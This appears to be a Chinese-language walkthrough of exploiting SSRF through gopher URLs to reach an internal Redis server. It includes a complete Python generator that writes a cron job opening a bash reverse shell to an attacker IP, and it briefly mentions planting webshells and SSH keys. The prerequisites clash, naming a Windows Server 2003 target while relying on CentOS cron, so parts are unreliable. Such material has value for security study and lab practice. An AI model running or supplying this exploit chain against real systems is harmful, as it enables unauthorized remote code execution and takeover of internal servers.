### Redis 数据传输分析

在尝试理解 Redis 服务器与客户端之间的数据交互时遇到了一些问题。以下是相关环境信息：
- **0.101 攻击者**
- **0.100 Redis 服务器**
- **0.104 Web 服务器**

为了明确每次访问 Redis 时的数据格式，我们首先使用 `socat` 监听 4444 端口，并将 Redis 的默认端口 6379 转发到 4444，从而监听通过 gopher 协议发送至 Redis 的流量。

**执行命令：**
```bash
# 在 Redis 服务器上运行
$ socat -v tcp-listen:4444,fork tcp-connect:192.168.0.100:6379
```

接着，在攻击机上通过 `redis-cli` 连接到 Redis 服务器的 4444 端口，并运行几个基本指令（假设 Redis 密码为 123456）：
- 输入密码
- 显示所有键
- 获取 `name` 键对应的值

根据 Redis 服务器的响应，可以得知每条命令的数据格式。如果我们构造的 gopher 请求也采用相同的格式，则可以通过利用 SSRF 漏洞来攻击内网中的 Redis 服务器。

**注意事项：**
实际操作中建议每次仅发送一条指令，因为过长的 URL 可能会引发 `UnicodeError: label empty or too long` 异常。

简而言之，Redis 命令字符串是以空格分隔的数组形式发送的。例如，`auth 123456` 将被解析成 `[‘auth’, ‘123456’]`。第一行指定了数组长度（*+数组长度），随后是每个元素的长度及内容（\$+字符串长度）。

### 利用 Redis 写入定时任务进行攻击

#### 前提条件
- 必须在 CentOS 上启动 Redis 以避免权限问题。
- 攻击目标为具有 SSRF 漏洞的 Windows Server 2003。

#### 步骤
1. 清除 Redis 中的所有数据。
2. 设置一个名为 `1` 的键，其值包含用于反弹 shell 的 cron 作业。
3. 更改 Redis 的工作目录和文件名配置，使其指向系统计划任务所在的目录。
4. 保存更改。

以下 Python 脚本可自动生成上述 Redis 命令并将其编码为 gopher 格式的 URL：

```python
import urllib.parse

protocol = "gopher://"
ip = "192.168.0.129"
port = "6379"
reverse_ip = "192.168.0.132"
reverse_port = "2333"
cron = "\n*/1 * * * * bash -i >& /dev/tcp/{}/{} 0>&1\n".format(reverse_ip, reverse_port)
filename = "root"
path = "/var/spool/cron"
passwd = ""

commands = [
    "flushall",
    "set 1 {}".format(cron.replace(" ", "${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
]

if passwd:
    commands.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
    CRLF = "\r\n"
    cmd = "*{}\r\n".format(len(arr))
    for x in arr:
        cmd += "${}\r\n{}\r\n".format(len(x.replace("${IFS}", " ")), x.replace("${IFS}", " "))
    return cmd

if __name__ == "__main__":
    for command in commands:
        payload += urllib.parse.quote(redis_format(command.split()))
    
    with open('Result.txt', 'w') as f:
        f.write(urllib.parse.quote(payload))
    
    with open("Result.txt", "r") as f:
        for line in f.readlines():
            print(line.strip())
```

运行该脚本后，将生成的 URL 发送到有漏洞的 Web 服务器即可触发攻击。成功后，CentOS 上会创建新的计划任务，而 Kali Linux 将接收到反弹回来的 Shell。

### 其他攻击方法
- **写入 WebShell**：类似地，可以将恶意 PHP 文件写入 Web 服务器根目录。
- **添加 SSH 公钥**：通过修改 Redis 配置，可以在远程主机上植入 SSH 公钥，从而实现无密码登录。

这些技术展示了如何利用未正确配置的安全措施对内部网络造成严重威胁。因此，确保关键服务如 Redis 的安全设置至关重要。